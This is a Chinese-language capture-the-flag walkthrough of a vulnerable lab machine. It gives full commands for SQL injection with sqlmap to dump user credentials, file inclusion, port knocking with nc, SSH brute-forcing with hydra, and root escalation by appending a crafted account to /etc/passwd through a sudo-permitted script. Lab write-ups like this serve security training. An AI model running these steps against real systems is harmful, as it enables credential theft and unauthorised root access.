# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668762406301-b21296f5-5121-4d03-842f-ec1d4eba9103.png#averageHue=%232b3543&clientId=ue7b9128b-3cfe-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u153c945c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=350&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88100&status=done&style=none&taskId=uedd5784b-0576-415e-b68f-6e87fa19768&title=&width=626)
nmap -p- -A 192.168.31.151
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668762490910-b975a2d4-a10f-4744-8b50-e36c0e67bddf.png#averageHue=%232a3543&clientId=ue7b9128b-3cfe-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=376&id=ucab7d48d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=376&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84481&status=done&style=none&taskId=u276ed7f4-dbf7-47c9-9b09-5a3ce5a2001&title=&width=651)
# web 突破
dirb 扫后台，没啥发现
访问 80 端口
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668762711322-4b88df8f-ccc7-4664-8315-e5a4b0bb996e.png#averageHue=%23dcdbd9&clientId=ue7b9128b-3cfe-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=758&id=uc2172112&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68636&status=done&style=none&taskId=ud9c9bd85-7b47-4050-ab7f-be11c5b8036&title=&width=1920)
Serach 页面有查询，既然是查询，可能会有 sql 注入
可以查询 Display All Records 页面里的人员信息
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763048903-55c6739e-6087-4473-b9a1-f5e1bb359322.png#averageHue=%23e5e5e2&clientId=ue7b9128b-3cfe-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=930&id=ud5b2a4ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=930&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117474&status=done&style=none&taskId=uca74aa15-b419-4ee2-aed7-9a0c24f23ea&title=&width=1920)
抓包看看
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763095619-07eea3be-d405-48c4-ad98-9a205cfa03d6.png#averageHue=%23f8f7f6&clientId=ue7b9128b-3cfe-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=378&id=uec39d65a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=378&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63574&status=done&style=none&taskId=u7852c032-5d4d-406d-8bb5-61e23dd7c16&title=&width=965)
post 提交，用 sqlmap
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" --dbs --batch
爆出数据库名
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763288848-8afb960d-bb75-4d4c-af42-61cef959820f.png#averageHue=%232a3645&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=185&id=ub9dcb209&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=522&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37429&status=done&style=none&taskId=u798033a3-e993-432d-807c-0c4108d727e&title=&width=522)
爆出 users 库的表名
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" -D "users" --tables --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763349221-ef47f1de-71a9-4223-91fc-abdbbd3a1fe7.png#averageHue=%23293442&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=198&id=u310c1d66&margin=%5Bobject%20Object%5D&name=image.png&originHeight=198&originWidth=521&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36767&status=done&style=none&taskId=ub6dc0e78-ce6a-425e-8c80-343f20e7c48&title=&width=521)
爆出 UserDetails 表中的字段
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" -D "users" -T "UserDetails" --columns --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763423142-30d9d050-77c0-43d6-9d64-4cd732d825ab.png#averageHue=%23283342&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=285&id=uf1a440eb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=285&originWidth=407&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27664&status=done&style=none&taskId=u7a0bfc31-d632-4b7d-accf-45dcb56eb58&title=&width=407)
dump 出 username 和 password
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" -D "users" -T "UserDetails" -C "username,password" --dump --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763746728-bf45aad7-0d7d-4991-865f-e23242e2c263.png#averageHue=%232a3747&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=429&id=uba5f42f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=429&originWidth=313&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40799&status=done&style=none&taskId=ud90ca6f9-b560-42f1-a920-bf3e565dc90&title=&width=313)
这里面是一些员工的账户密码
爆破 Staff 数据库
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" -D "Staff" --tables --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763842089-f03cb5a9-2a4e-47c6-bc25-02e4479e0b9e.png#averageHue=%23293546&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=129&id=ucafec6e1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=129&originWidth=226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7768&status=done&style=none&taskId=u70afe064-48ae-4b59-8a59-216947c9da7&title=&width=226)
爆出 Users 表的列名
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" -D "Staff" -T "Users" --columns --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668763929888-2672cc64-65d9-43ff-aadd-d7563a06faff.png#averageHue=%23283443&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=168&id=u98391ed2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=168&originWidth=323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14749&status=done&style=none&taskId=u6e4b8654-c24f-493c-9d56-ea37b564d36&title=&width=323)
dump 出 username 和 password 字段
sqlmap -u "http://192.168.31.151/results.php" --data "search=1" -D "Staff" -T "Users" -C "Username,Password" --batch --dump
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668764938975-ae150f55-bb7c-4750-8c11-84a3de578a29.png#averageHue=%2327303d&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=172&id=u0789bb9b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=597&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22170&status=done&style=none&taskId=u04b3ad42-de73-4b6f-9575-0a84c233633&title=&width=597)
得到 admin：transorbital1
登录试试
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668764991417-7a19019a-a05e-4166-8360-f8c0094da4ee.png#averageHue=%23e9cea2&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=408&id=ufa57486c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=408&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22039&status=done&style=none&taskId=u59c9f329-adac-4940-ac7e-1bc62ced012&title=&width=875)
登录成功，但显示了个文件不存在
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668765019304-69287995-f45b-4715-b6e8-3f4af286d2e9.png#averageHue=%23e9cfa5&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=372&id=ua8ef71c9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=372&originWidth=745&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20130&status=done&style=none&taskId=u386520fd-6036-4f3b-8290-0917bd75bfc&title=&width=745)
提示文件不存在，意思就是这个页面有文件包含
尝试文件包含
尝试多次后成功实现文件包含
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668765146007-53e0972f-d3ee-4e8b-8ed8-915a3360d61c.png#averageHue=%23f8f6f2&clientId=uee04151d-d0c2-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=809&id=ud8a2f0e1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=809&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=179785&status=done&style=none&taskId=u0f9dea3e-f4db-4654-a1dc-a365dfda772&title=&width=1920)
好像没啥用
ssh 爆破，将之前 users 数据库中的用户名和密码分别放到两个密码本里
hydra -L 1.txt -P 2.txt 192.168.31.151 ssh
显示 ssh 拒绝连接
nmap -p22 192.168.31.151
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668766254616-d1733370-7363-4e12-a3ec-d9b457223e0c.png#averageHue=%2328303c&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=154&id=u0db63ac2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=470&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32317&status=done&style=none&taskId=ued186417-169c-457d-bdb9-ef4244ad5f6&title=&width=470)
22 端口是过滤状态
使用文件包含查看 ssh 的配置文件 knockd.conf
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668766323146-76a210a9-f1cc-4f0c-827d-7fa9bcc69ea1.png#averageHue=%23fcfcfb&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=641&id=u9800f49d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=641&originWidth=1873&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99908&status=done&style=none&taskId=u366590cb-48f1-4bab-8f6d-d616dab536f&title=&width=1873)
发现 ssh 自定义的端口号，依次进行敲门
_之所以要敲门是因为服务端开启了 Secure Shell (_[_SSH_](https://so.csdn.net/so/search?q=SSH&spm=1001.2101.3001.7020)_) 连接  _

1. _把 SSH 的标准端口改为不常用的值并增强 SSH 配置，从而挡住最简单的攻击。_
2. _定义有限的用户列表，只允许这些用户登录。_
3. _完全隐藏允许 SSH 访问的事实，要求根据特殊的 “敲门” 序列识别有效用户。_

_该靶场使用的是第三种_
敲门：
```php
for x in 7469 8475 9842; do nc 192.168.31.151 $x;done
```
然后再使用 nmap -p22 192.168.31.151
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668766544925-8471d577-1ee2-4c62-aa10-f36d5797ec82.png#averageHue=%23272e3a&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=315&id=ub8c2331c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=315&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69671&status=done&style=none&taskId=u3c98368c-d2ae-4073-b3c6-3dd6b1920b0&title=&width=724)
22 端口开启了
接着上面的 hydra 爆破
可以得到两组账户
chandlerb：UrAG0D!
janitor：Ilovepeepee
登录 janitor
进来之后在 janitor 的家目录下发现隐藏文件
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668766915171-46d131c2-4082-4210-a9a0-6650e4421d61.png#averageHue=%2328303d&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=172&id=u0f5d933b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=707&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39813&status=done&style=none&taskId=uefb162b0-7157-4278-b784-e437a9454f0&title=&width=707)
进入 .secrets-for-putin 文件，有个密码本
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668767021138-ca7218ce-e863-473f-bb03-9aa6cae409d9.png#averageHue=%2328313d&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=258&id=u341dda55&margin=%5Bobject%20Object%5D&name=image.png&originHeight=258&originWidth=774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51922&status=done&style=none&taskId=ua58588b0-cf6a-4f98-aa55-485229cc279&title=&width=774)
将这个密码本加入到刚刚爆破 ssh 用的密码本里，再次爆破
hydra -L 1.txt -P 2.txt 192.168.31.151 ssh -t 4
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668767226744-bb54ff59-ed59-4139-92a3-0425a73e54eb.png#averageHue=%232b3642&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=236&id=ub0b018f4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=850&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85760&status=done&style=none&taskId=u15985d03-c61b-45bc-bd9a-b791f8867e0&title=&width=850)
用新账户 fredf：B4-Tru3-001 来登录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668767319771-d4a0ac93-abea-4304-ac68-cce81764797d.png#averageHue=%232a3442&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=251&id=uea1558d9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=251&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52464&status=done&style=none&taskId=uddaee8d2-f839-4ff4-9948-5f2c4886474&title=&width=593)
登录成功
查看权限 sudo -l
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668767466429-ef9070bd-b87f-4180-8469-455e2dc95e33.png#averageHue=%232a3442&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=224&id=ua9e1dc22&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=543&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48033&status=done&style=none&taskId=u93e01b83-68d6-49f5-bfb0-788ce447ece&title=&width=543)
可以无密码使用 /opt/devstuff/dist/test/test
看看这个 test 是啥
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668768081646-4e32cee6-cf87-4fc7-8cde-d6b92af28acc.png#averageHue=%232c3644&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=45&id=u02ad85a7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=45&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8790&status=done&style=none&taskId=u5f48cd15-ac25-4c19-b6ca-9b8f5adee4e&title=&width=579)
提示说是叫 test.py
find 找一下
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668768128438-ef074b64-8392-4054-b629-fa76bc8f0473.png#averageHue=%232b3543&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=85&id=u9adfe120&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=461&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14147&status=done&style=none&taskId=u8a75770f-e26e-4adc-b931-366e9455681&title=&width=461)
得知是 /opt/devstuff/test.py
查看
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668767519819-c9938b32-ae38-4623-a140-db7057f342b0.png#averageHue=%23272f3c&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=351&id=u6b21baa4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=495&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47664&status=done&style=none&taskId=ufd15f03a-aa97-429c-b83a-c2a3056f322&title=&width=495)
这段代码的意思是 文件1以‘r’打开，读取内容到output，文件2以’a’，append打开，把output追加到文件2  
既然 test.py 拥有 root 权限，那我们可以构造一个拥有 root 权限的账户，将其储存在 /etc/passwd 中即可

# 提权
使用 kali openssl 创建一个本地加密用户
```php
openssl passwd -1 -salt admin 123456

 openssl是一个安全套接字层密码库，囊括主要的密码算法、常用密钥、证书封装管理功能及实现ssl协议
-1 的意思是使用md5加密算法
-salt 自动插入一个随机数作为文件内容加密
admin 123456 用户名和密码
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668768369753-18339c87-4e47-41a0-a26b-1d0340b3a518.png#averageHue=%232c3644&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=68&id=u13022fdd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=68&originWidth=394&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13758&status=done&style=none&taskId=uf648bf15-be8e-4d75-b772-000a4ff1367&title=&width=394)
复制下来，在靶机中将这句话加工后 echo 到 /etc/passwd 中
admin:$1$admin$2WRLhTGcIMgZ7OhwCpREK1:0:0::/root:/bin/bash
然后运行 sudo /opt/devstuff/dist/test/test /tmp/qqq /etc/passwd（免密）
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668768646518-0f62cba3-423a-4e88-a34f-f502dcca4382.png#averageHue=%2329323f&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=105&id=ubfd2111a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=105&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30471&status=done&style=none&taskId=ud49b9b23-0cb7-4d80-8716-883aa26d8d9&title=&width=977)
提权成功，拿flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668768736192-2c274148-20db-4b36-9ac9-26e81a159f26.png#averageHue=%233a434e&clientId=uab245c73-fa6f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=393&id=u8a157249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77613&status=done&style=none&taskId=u45ee321e-225c-4f41-aa80-1467db61e71&title=&width=901)


